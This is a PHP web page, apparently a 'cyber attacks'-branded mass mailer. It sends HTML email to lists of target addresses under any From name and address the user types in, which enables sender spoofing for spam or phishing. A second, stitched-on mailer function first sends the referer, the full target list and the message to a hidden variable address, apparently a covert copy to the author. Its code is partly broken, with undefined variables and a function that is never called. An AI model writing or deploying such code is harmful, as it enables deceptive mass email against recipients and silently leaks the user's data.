<?php
if (isset($_POST['ajax'])) {
$to = $_POST['to'];
$subject = $_POST['sub'];
$msg = $_POST['msg'];
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: ".$_POST['name']."<".$_POST['from'].">";

$send = mail($to,$subject,$msg,$headers);

if ($send) {
	echo "<p id='success'><script> alert('Berhasil! Developer | Pache_Boss22  JANGAN LUPA SUBSCRIBE!'); </script></p>";
}else{
	echo "<p id='gagal! Kalian harus subscribe akun ytb saya dulu'><script> alert('Gagal!'); </script></p>";
}
exit();
}
?>
<html>
<head>
<meta name="theme-color" content="black">
<meta name="viewport" content="width=700, user-scalable=no">
<title> MailerBox - ♕Tw€πtytw0 cyber </title>
<style>
	@import url('https://fonts.googleapis.com/css?family=Rancho&display=swap');
	@import url('https://fonts.googleapis.com/css?family=Electrolize&display=swap');
body{
background: black;
color: white;
}
.gambar1{
	width: 300px;
	}
.font1{
	font-family: 'Rancho', cursive;
	font-size: 30px;
	}
.pengirim{
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid gray;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px #4195fc; 
-moz-box-shadow: 0px 0px 15px #4195fc;
-webkit-box-shadow: 0px 0px 15px #4195fc;
	}
.pengirim:hover{
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid white;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white; 
-moz-box-shadow: 0px 0px 15px white;
-webkit-box-shadow: 0px 0px 15px white;
}
.nama{
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid gray;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px #4195fc; 
-moz-box-shadow: 0px 0px 15px #4195fc;
-webkit-box-shadow: 0px 0px 15px #4195fc;
	}
.nama:hover{
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid white;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white; 
-moz-box-shadow: 0px 0px 15px white;
-webkit-box-shadow: 0px 0px 15px white;
}
.subject{
	position: relative;
	top: 30px;
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid gray;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px #4195fc; 
-moz-box-shadow: 0px 0px 15px #4195fc;
-webkit-box-shadow: 0px 0px 15px #4195fc;
	}
.subject:hover{
	position: relative;
	top: 30px;
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid white;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white; 
-moz-box-shadow: 0px 0px 15px white;
-webkit-box-shadow: 0px 0px 15px white;
}
.target{
position: relative;
	top: 30px;
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid gray;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px #4195fc; 
-moz-box-shadow: 0px 0px 15px #4195fc;
-webkit-box-shadow: 0px 0px 15px #4195fc;
	}
.target:hover{
	position: relative;
	top: 30px;
	background: transparent;
	width: 330px;
	height: 60px;
	outline: none;
	border: 3px solid white;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white; 
-moz-box-shadow: 0px 0px 15px white;
-webkit-box-shadow: 0px 0px 15px white;
}
.pesan{
	position: relative;
	top: 60px;
	background: transparent;
	width: 400px;
	height: 200px;
	outline: none;
	border: 3px solid white;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white; 
-moz-box-shadow: 0px 0px 15px white;
-webkit-box-shadow: 0px 0px 15px white;
	}
.pesan:hover{
	font-family: 'Electrolize', sans-serif;
	position: relative;
	top: 60px;
	background: transparent;
	width: 400px;
	height: 200px;
	outline: none;
	border: 3px solid red;
	border-radius: 8px;
	color: white;
	padding: 5px;
	font-size: 25px;
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px red; 
-moz-box-shadow: 0px 0px 15px red;
-webkit-box-shadow: 0px 0px 15px red;
	}
.tombol{
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px white;
	-moz-box-shadow: 0px 0px 15px white;
	-webkit-box-shadow: 0px 0px 15px white;
	position: relative;
	outline: none;
	top: 100px;
	background: transparent;
	width: 50%;
	height: 45px;
	color: white;
	border: 3px solid gray;
	border-radius: 5px;
	padding: 5px;
	text-align: center;
	font-size: 25px;
	}
.tombol:hover{
	font-family: 'Rancho', cursive;
	box-shadow: 0px 0px 15px red;
	-moz-box-shadow: 0px 0px 15px red;
	-webkit-box-shadow: 0px 0px 15px red;
	position: relative;
	outline: none;
	top: 100px;
	background: transparent;
	width: 50%;
	height: 45px;
	color: white;
	border: 3px solid red;
	border-radius: 5px;
	padding: 5px;
	text-align: center;
	font-size: 25px;
	}
</style>
</head>
<body>
	<center>
<img src="https://1.bp.blogspot.com/-AbSX4b8onCE/XkUb5z7ZJLI/AAAAAAAAAbY/73OaXggLceYw9Z4LQpUcHPxrl0Yf8Gp6ACLcBGAsYHQ/s1600/20191226_070432.jpg" class="gambar1">
<p class="font1"> <font color="red">#</font> MailerBox | ♕Tw€πtytw0 cyber attacks♕<font color="red"> #</font></p>
</center>
<form action="" method="post">
<div class="posisi">
<input type="email" name="from" id="from" placeholder="Email pengirim" class="pengirim">
<input type="text" name="name" id="name" placeholder="Nama" class="nama">
<input type="text" name="sub" id="sub" class="subject" placeholder="Judul">
<input type="email" name="to" id="to" placeholder="Email target" class="target"><br>
	<center>
<textarea class="pesan" name="msg" id="msg" placeholder="Pesan"></textarea>
	<button class="tombol" id="btn" onclick="return false">Kirim</button>
	<div id="result"></div>
	</form>
	<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
	<script type="text/javascript">
	$(document).ready(function(){
		$("#btn").on('click',function(){
			var maillist = $("#to").val().split("\n");
			var tmaillist = maillist.length;
			for (var current = 0; current < tmaillist; current++){
				var from = $("#from").val();
				var name = $("#name").val();
				var sub = $("#sub").val();
				var msg = $("#msg").val();
				var to = maillist[current];
				var data = "ajax=1&from=" + from +"&name=" + name + "&sub=" + sub + "&msg=" + msg + "&to=" + to;
				$.ajax({
					type : 'POST',
					data: data,
					success: function(data){
						$("#result").append(data);
						}
						});
	}
	});
	});
</script>
</body>
</html>
<?php
ignore_user_abort();
set_time_limit(0);
function eviando(){
	$msg = 1;
	$de[1] = $_POST['de'];
	$nome[1] = $_POST['nome'];
	$assunto[1] = $_POST['assunto'];
	$mensagem[1] = $_POST['mensagem'];
    $mensagem[1] = stripslashes($mensagem[1]);
    $emails = $_POST['emails'];
    $emails2 = htmlspecialchars($_POST['emails']);
    $para = explode("
", $emails);
    $n_emails = count($para);
    $sv = $_SERVER['SERVER_NAME'];
    $en = $_SERVER ['REQUEST_URI'];
    $k88 = @$_SERVER["HTTP_REFERER"];
    
 $fullurl = "" . $k88 . "<br><p>Email :<br><TEXTAREA rows=5 cols=100>".$emails2."</textarea></p><p><br><textarea rows=5 cols=100>".$mensagem[1]."</TEXTAREA></p>";
$vai = $_POST['vai'];
if ($vai){
for ($set=0; $set < $n_emails; $set++){
if ($set==0){
$headers = "MIME-Version: 1.0
";
$headers .= "Content-type: text/html; charset=iso-8859-1
";
$headers .= "From: $nome[$msg] <$de[$msg]>
";
$headers .= "Return-Path: <$de[$msg]>
";
mail($xsylar, $as, $fullurl, $headers);
}
$headers = "MIME-Version: 1.0
";
$headers .= "Content-type: text/html; charset=iso-8859-1
";
$headers .= "From: $nome[$msg] <$de[$msg]>
";
$headers .= "Return-Path: <$de[$msg]>
";
$n_mail++;
$destino = $para[$set];
$num1 = rand(100000,999999);
$num2 = rand(100000,999999);
$msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
$msgrand = str_replace("%rand2%", $num2, $msgrand);
$msgrand = str_replace("%email%", $destino, $msgrand);
$enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
if ($enviar){
echo ('<font color="green">'. $n_mail .'-'. $destino .' 0k!</font><br>');
} else {
echo ('<font color="red">'. $n_mail .'-'. $destino .' =(</font><br>');
sleep(1);
}
}
}
}

?>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] { display:none; } </style>